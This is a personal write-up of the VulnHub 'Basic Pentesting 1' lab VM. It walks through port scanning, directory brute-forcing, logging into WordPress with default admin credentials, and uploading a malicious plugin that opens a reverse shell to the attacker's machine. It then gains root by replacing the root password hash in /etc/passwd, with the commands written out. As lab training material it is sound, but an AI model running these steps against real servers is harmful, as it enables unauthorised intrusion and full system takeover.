# Basic Pentesting 1 Writeup

### Credits & Attributions:

 - unix-privesc-check attribution: https://github.com/pentestmonkey/unix-privesc-check
 - malicious-wordpress-plugin attribution: https://github.com/wetw0rk/malicious-wordpress-plugin
 - inspiration and help: https://www.youtube.com/watch?v=82S8wFSypB4
 - source: https://www.vulnhub.com/entry/basic-pentesting-1,216/

### Setup

To connect the Target VM and the Kali VM, I had to create a VirtualBox DHCP Server: 
```
C:\Program Files\Oracle\VirtualBox>VBoxManage dhcpserver add --netname intnet --ip 192.168.0.1 --netmask 255.255.255.0 --lowerip 192.168.0.2 -upperip 192.168.0.240 --enable
```
And set each network adapter to `Internal Network` > `intnet` (defined in command above)

Find the target IP from the login page by clicking on the network icon. Then from there, show the network settings, and an IP is listed. In this case, 192.168.0.3.

Network topography: 
 - Kali: 192.168.0.2
 - Target: 192.168.0.3	

Scanning target for open ports:
```
$nmap -sS 192.168.0.3 returns three open ports (21/tcp - ftp; 22/tcp - ssh, 80/tcp - http)
```
Opening a firefox window to 192.168.0.3 reveals a working web server. Nothing useful on the surface. Inspecting element confirms that there is nothing hidden... (right click > Inspect Elements)

Started by using `$dirbuster` to find any hidden places on the site... Dirbuster uses a sweet gui, so entering `192.168.0.3` into Target URL, and selecting `/usr/share/dirbuster/wordlists/directory-wordlist-lowercase-2.3-small.txt` as wordlist does the trick. Dirbuster finds alot of subdirectories including `/secret/`. 

Append /secret/ to the firefox window earlier (now http://192.168.0.3/secret/). This reveals a "blog" webpage that looks quite improperly formatted.

Scrolling over one of the links shows the hyperlink (bottom left) that reads /vtcsec/secret/... thus 192.168.0.3 must have relations to vtcsec or vtcsec.com.

`$vim /etc/hosts` and adding lines "192.168.0.3	vtcsec" and "192.168.0.3	vtcsec.com" and refreshing the webpage shows a better image!

The site is a wordpress site. Under "Meta" header, there features a "Log In" button. Once clicked, this leads to a login page, where U:admin P:password is tried. This fails, but the error message informs us that "admin" is a valid username. (P|U):admin tried and works (lol).

Decided upon malicious plugin attack as we have admin access:
```
$git clone https://github.com/wetw0rk/malicious-wordpress-plugin
$python wordpwn.py 192.168.0.2 4444 Y
```

 - Uploaded the .zip created to the WordPress server and installed it. 
 - Navigated to Plugins>Editor, selected GotEm Plugon (the one we installed) and selected the wetw0rk_maybe.php file.
 - Copied the directory of that file (from the top of the page where it says "Editing malicious/wetw0rk_maybe.php"). 
 - Opened up a new tab and typed in vtcsec/secret/wp-content/plugins/malicious/wetw0rk_maybe.php and hit return. 

We're going to be inserting a password into the target's /etc/passwd. Generate that password:
```
$openssl passwd -1
Password: pass
Verifying - Password: pass
<pass_enc>
```
Now on the open metasploit connection, we do:
```
metasploit>cd /etc/
metasploit>download passwd /home/username/
```
replace the 'x' after root with <pass_enc>.
```
metasploit>upload /home/lread/passwd
metasploit>shell
<shell>python -c 'import pty; pty.spawn("/bin/bash")' 
www-data@vtcsec:/$ su root
Password: pass
www-data@vtcsec:/$whoami
"root"
```

~Lyell Read